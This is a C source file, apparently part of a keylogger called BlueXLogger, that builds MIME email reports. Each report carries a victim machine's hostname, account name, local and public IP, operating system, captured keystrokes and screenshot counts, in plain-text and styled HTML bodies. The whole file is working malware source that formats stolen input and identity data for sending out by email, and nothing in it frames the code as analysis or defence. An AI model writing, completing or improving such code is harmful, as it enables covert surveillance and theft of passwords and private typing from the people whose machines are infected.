/*============================================================================
 * BlueXLogger - bxl_mime.c
 * RFC 5322 / MIME message construction.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_mime.h"
#include "bxl_base64.h"
#include "bxl_format.h"

/*==========================================================================
 * Helpers
 *========================================================================*/
void bxl_mime_sanitize_header(char *s)
{
    char *w;
    if (!s) return;
    w = s;
    for (; *s; s++) {
        if (*s == '\r' || *s == '\n') continue;
        *w++ = *s;
    }
    *w = '\0';
}

static void make_boundary(char *out, size_t cch, const char *tag)
{
    static LONG counter = 0;
    LONG  c = InterlockedIncrement(&counter);
    bxl_u64 t = bxl_unix_time();
    bxl_u32 r = (bxl_u32)(t ^ (bxl_u64)(c * 2654435761u) ^ GetTickCount());

    /* '=' leads, which cannot appear in a header value, so the delimiter is
     * guaranteed not to collide with message content in practice. */
    StringCchPrintfA(out, cch, "=_BlueX_%s_%08lx%04x%04x", tag,
                     (unsigned long)t, (unsigned)(c & 0xFFFF),
                     (unsigned)(r & 0xFFFF));
}

static int append_header_line(BxlBuf *out, const char *name,
                              const char *value, int encode)
{
    int n = 0;
    n += bxl_buf_appends(out, name);
    n += bxl_buf_appends(out, ": ");
    if (encode) {
        if (!bxl_header_encode(value, out)) return 0;
    } else {
        char tmp[BXL_MAX_EMAIL * 2];
        bxl_str_copy(tmp, sizeof(tmp), value);
        bxl_mime_sanitize_header(tmp);
        n += bxl_buf_appends(out, tmp);
    }
    n += bxl_buf_appends(out, "\r\n");
    return n;
}

/*==========================================================================
 * Size estimation
 *========================================================================*/
static size_t b64_len(size_t n)
{
    return ((n + 2) / 3) * 4 + ((n / 57) + 2) * 2;
}

size_t bxl_mime_estimate_size(const BxlMessage *msg)
{
    size_t total = 0;
    size_t i;

    if (!msg) return 0;

    total += 2048;                                   /* headers + boundaries */
    total += b64_len(msg->body_text_len ? msg->body_text_len : 0);
    total += b64_len(msg->body_html_len);
    for (i = 0; i < msg->att_count && i < BXL_MAX_ATTACHMENTS; i++)
        total += b64_len(msg->atts[i].len) + 512;
    return total;
}

/*==========================================================================
 * Build
 *========================================================================*/
static int append_body_part(BxlBuf *out, const char *boundary,
                            const char *content_type, const char *text,
                            size_t text_len)
{
    bxl_buf_appends(out, "\r\n--");
    bxl_buf_appends(out, boundary);
    bxl_buf_appends(out, "\r\nContent-Type: ");
    bxl_buf_appends(out, content_type);
    bxl_buf_appends(out, "\r\nContent-Transfer-Encoding: base64\r\n\r\n");

    if (text && text_len)
        bxl_base64_encode(text, text_len, 76, out);

    bxl_buf_appends(out, "\r\n");
    return BXL_TRUE;
}

static int append_attachment_part(BxlBuf *out, const char *boundary,
                                  const BxlAttachment *a)
{
    if (!a) return BXL_FALSE;

    bxl_buf_appends(out, "\r\n--");
    bxl_buf_appends(out, boundary);
    bxl_buf_appends(out, "\r\nContent-Type: ");
    bxl_buf_appends(out, a->mime_type[0] ? a->mime_type : "application/octet-stream");
    bxl_buf_appends(out, "; name=\"");
    bxl_buf_appends(out, a->filename);
    bxl_buf_appends(out, "\"\r\nContent-Transfer-Encoding: base64\r\n");
    bxl_buf_appends(out, "Content-Disposition: attachment; filename=\"");
    bxl_buf_appends(out, a->filename);
    bxl_buf_appends(out, "\"\r\n\r\n");

    if (a->data && a->len)
        bxl_base64_encode(a->data, a->len, 76, out);

    bxl_buf_appends(out, "\r\n");
    return BXL_TRUE;
}

int bxl_mime_build(const BxlMessage *msg, BxlBuf *out)
{
    char  outer[128];
    char  alt[128];
    int   has_att, has_html;
    size_t i;

    if (!msg || !out) return BXL_FALSE;

    has_att  = (msg->att_count > 0) ? 1 : 0;
    has_html = (msg->body_html && msg->body_html_len > 0) ? 1 : 0;

    make_boundary(outer, sizeof(outer), "MIX");
    make_boundary(alt,   sizeof(alt),   "ALT");

    /* ---- top-level headers --------------------------------------------- */
    append_header_line(out, "From", msg->from, 0);
    append_header_line(out, "To", msg->to, 0);
    append_header_line(out, "Subject", msg->subject, 1);
    {
        char date[64];
        bxl_format_rfc5322(msg->date_unix, date, sizeof(date));
        append_header_line(out, "Date", date, 0);
    }
    bxl_buf_appends(out, "MIME-Version: 1.0\r\n");
    bxl_buf_appends(out, "X-Mailer: " BXL_XMAILER "\r\n");
    bxl_buf_appends(out, "X-Watermark: " BXL_WATERMARK "\r\n");
    bxl_buf_appends(out, "X-BlueXLogger-Host: ");
    bxl_buf_appends(out, msg->from);   /* overwritten by caller if desired */
    bxl_buf_appends(out, "\r\n");

    if (!has_att && !has_html) {
        /* ---- simplest case: a single text/plain part -------------------- */
        bxl_buf_appends(out, "Content-Type: text/plain; charset=UTF-8\r\n");
        bxl_buf_appends(out, "Content-Transfer-Encoding: base64\r\n\r\n");
        if (msg->body_text && msg->body_text_len)
            bxl_base64_encode(msg->body_text, msg->body_text_len, 76, out);
        bxl_buf_appends(out, "\r\n");
        return BXL_TRUE;
    }

    if (!has_att && has_html) {
        /* ---- multipart/alternative ------------------------------------- */
        bxl_buf_appends(out, "Content-Type: multipart/alternative; boundary=\"");
        bxl_buf_appends(out, alt);
        bxl_buf_appends(out, "\"\r\n\r\nThis is a multi-part message in MIME format.\r\n");

        append_body_part(out, alt, "text/plain; charset=UTF-8",
                         msg->body_text, msg->body_text_len);
        append_body_part(out, alt, "text/html; charset=UTF-8",
                         msg->body_html, msg->body_html_len);

        bxl_buf_appends(out, "\r\n--");
        bxl_buf_appends(out, alt);
        bxl_buf_appends(out, "--\r\n");
        return BXL_TRUE;
    }

    /* ---- multipart/mixed ----------------------------------------------- */
    bxl_buf_appends(out, "Content-Type: multipart/mixed; boundary=\"");
    bxl_buf_appends(out, outer);
    bxl_buf_appends(out, "\"\r\n\r\nThis is a multi-part message in MIME format.\r\n");

    if (has_html) {
        bxl_buf_appends(out, "\r\n--");
        bxl_buf_appends(out, outer);
        bxl_buf_appends(out, "\r\nContent-Type: multipart/alternative; boundary=\"");
        bxl_buf_appends(out, alt);
        bxl_buf_appends(out, "\"\r\n");

        append_body_part(out, alt, "text/plain; charset=UTF-8",
                         msg->body_text, msg->body_text_len);
        append_body_part(out, alt, "text/html; charset=UTF-8",
                         msg->body_html, msg->body_html_len);

        bxl_buf_appends(out, "\r\n--");
        bxl_buf_appends(out, alt);
        bxl_buf_appends(out, "--\r\n");
    } else {
        append_body_part(out, outer, "text/plain; charset=UTF-8",
                         msg->body_text, msg->body_text_len);
    }

    for (i = 0; i < msg->att_count && i < BXL_MAX_ATTACHMENTS; i++)
        append_attachment_part(out, outer, &msg->atts[i]);

    bxl_buf_appends(out, "\r\n--");
    bxl_buf_appends(out, outer);
    bxl_buf_appends(out, "--\r\n");

    return BXL_TRUE;
}

/*==========================================================================
 * Report content
 *========================================================================*/
/* The identity fields, with a NULL struct degrading to "unknown" rather than
 * to an empty string that reads as a formatting bug. */
static const char *id_field(const char *s)
{
    return (s && s[0]) ? s : "unknown";
}

int bxl_mime_make_subject(char *out, size_t out_cch, const char *prefix,
                          const BxlIdentity *id, bxl_u64 unix_now)
{
    char stamp[32];
    char who[BXL_ID_HOSTNAME + BXL_ID_USERNAME + 2];

    bxl_format_timestamp(unix_now, stamp, sizeof(stamp));

    if (id)
        StringCchPrintfA(who, sizeof(who), "%s/%s",
                         id_field(id->hostname), id_field(id->username));
    else
        StringCchCopyA(who, sizeof(who), "unknown/unknown");

    return SUCCEEDED(StringCchPrintfA(out, out_cch, "%s - %s - %s",
                                      (prefix && prefix[0]) ? prefix
                                                            : BXL_DEFAULT_SUBJECT,
                                      who, stamp));
}

int bxl_mime_make_body(char *out, size_t out_cch, const BxlIdentity *id,
                       bxl_u64 unix_now,
                       const char *log_text, size_t log_len,
                       unsigned screenshot_count)
{
    BxlBuf b;
    char   stamp[32];
    int    ok;

    if (!out || out_cch == 0) return BXL_FALSE;

    if (!bxl_buf_init(&b, 4096)) return BXL_FALSE;

    bxl_format_timestamp(unix_now, stamp, sizeof(stamp));

    bxl_buf_appendf(&b,
        "========================================================================\r\n"
        " " BXL_PRODUCT_NAME " report\r\n"
        " " BXL_WATERMARK "\r\n"
        "========================================================================\r\n"
        "\r\n"
        "Machine   : %s\r\n"
        "Account   : %s\r\n"
        "Local IP  : %s\r\n"
        "Public IP : %s\r\n"
        "System    : %s\r\n"
        "Generated : %s UTC\r\n"
        "Screens   : %u\r\n"
        "\r\n"
        "------------------------------------------------------------------------\r\n"
        " CAPTURED INPUT\r\n"
        "------------------------------------------------------------------------\r\n",
        id ? id_field(id->hostname)  : "unknown",
        id ? id_field(id->username)  : "unknown",
        id ? id_field(id->local_ip)  : "unknown",
        id ? id_field(id->public_ip) : "unknown",
        id ? id_field(id->os)        : "unknown",
        stamp,
        screenshot_count);

    if (log_text && log_len) {
        bxl_buf_append(&b, log_text, log_len);
        if (log_len && log_text[log_len - 1] != '\n')
            bxl_buf_appends(&b, "\r\n");
    } else {
        bxl_buf_appends(&b, "(no keystrokes captured in this window)\r\n");
    }

    bxl_buf_appendf(&b,
        "\r\n"
        "------------------------------------------------------------------------\r\n"
        " " BXL_WATERMARK "\r\n"
        "------------------------------------------------------------------------\r\n");

    ok = SUCCEEDED(StringCchCopyA(out, out_cch, b.data));
    bxl_buf_free(&b);
    return ok;
}

static int html_escape(BxlBuf *out, const char *s, size_t len)
{
    size_t i;
    for (i = 0; i < len; i++) {
        switch (s[i]) {
        case '&': bxl_buf_appends(out, "&amp;");  break;
        case '<': bxl_buf_appends(out, "&lt;");   break;
        case '>': bxl_buf_appends(out, "&gt;");   break;
        case '"': bxl_buf_appends(out, "&quot;"); break;
        case '\'': bxl_buf_appends(out, "&#39;"); break;
        default:  bxl_buf_appendc(out, s[i]);     break;
        }
    }
    return BXL_TRUE;
}

int bxl_mime_make_body_html(char *out, size_t out_cch, const BxlIdentity *id,
                            bxl_u64 unix_now,
                            const char *log_text, size_t log_len,
                            unsigned screenshot_count)
{
    BxlBuf b;
    char   stamp[32];
    char   meta[1024];
    int    ok;

    if (!out || out_cch == 0) return BXL_FALSE;
    if (!bxl_buf_init(&b, 4096)) return BXL_FALSE;

    bxl_format_timestamp(unix_now, stamp, sizeof(stamp));

    /* The identity fields are built into a scratch string first so they can be
     * HTML-escaped as a unit; a machine name is attacker-influenced in the
     * sense that it is not ours, so it must not be able to inject markup. */
    {
        char raw[768];
        BxlBuf esc;

        StringCchPrintfA(raw, sizeof(raw),
            "Machine <b>%s</b> &nbsp;|&nbsp; Account <b>%s</b> "
            "&nbsp;|&nbsp; IP <b>%s</b> / <b>%s</b> "
            "&nbsp;|&nbsp; System <b>%s</b> "
            "&nbsp;|&nbsp; Generated <b>%s UTC</b> "
            "&nbsp;|&nbsp; Screenshots <b>%u</b>",
            id ? id_field(id->hostname)  : "unknown",
            id ? id_field(id->username)  : "unknown",
            id ? id_field(id->local_ip)  : "unknown",
            id ? id_field(id->public_ip) : "unknown",
            id ? id_field(id->os)        : "unknown",
            stamp, screenshot_count);

        if (bxl_buf_init(&esc, sizeof(raw) * 6 + 64)) {
            html_escape(&esc, raw, strlen(raw));
            StringCchCopyA(meta, sizeof(meta), esc.data);
            bxl_buf_free(&esc);
        } else {
            StringCchCopyA(meta, sizeof(meta), "identity unavailable");
        }
    }

    bxl_buf_appends(&b,
        "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
        "<style>"
        "body{background:#12151c;color:#d7dee9;font:13px/1.5 'Segoe UI',Arial,sans-serif;margin:0;padding:24px}"
        ".card{max-width:900px;margin:0 auto;background:#1a1f2b;border:1px solid #2b3446;border-radius:10px;overflow:hidden}"
        ".hd{padding:16px 20px;border-bottom:1px solid #2b3446;background:#151a24}"
        ".hd h1{margin:0;font-size:16px;color:#5aa9ff;letter-spacing:.4px}"
        ".hd p{margin:4px 0 0;font-size:11px;color:#7d8ba3}"
        ".meta{padding:14px 20px;font-size:12px;color:#9fb0c8;border-bottom:1px solid #2b3446}"
        ".meta b{color:#d7dee9;font-weight:600}"
        ".log{padding:16px 20px;white-space:pre-wrap;word-break:break-word;"
        "font:12px/1.55 Consolas,'Cascadia Mono',monospace;color:#c9d6e8}"
        ".ft{padding:12px 20px;border-top:1px solid #2b3446;font-size:11px;color:#6f7d94;background:#151a24}"
        "</style></head><body><div class=\"card\">");

    bxl_buf_appends(&b, "<div class=\"hd\"><h1>" BXL_PRODUCT_NAME " report</h1><p>"
                        BXL_WATERMARK "</p></div>");

    bxl_buf_appendf(&b, "<div class=\"meta\">%s</div>", meta);

    bxl_buf_appends(&b, "<div class=\"log\">");
    if (log_text && log_len)
        html_escape(&b, log_text, log_len);
    else
        bxl_buf_appends(&b, "(no keystrokes captured in this window)");
    bxl_buf_appends(&b, "</div>");

    bxl_buf_appends(&b, "<div class=\"ft\">" BXL_WATERMARK "</div>");
    bxl_buf_appends(&b, "</div></body></html>");

    ok = SUCCEEDED(StringCchCopyA(out, out_cch, b.data));
    bxl_buf_free(&b);
    return ok;
}
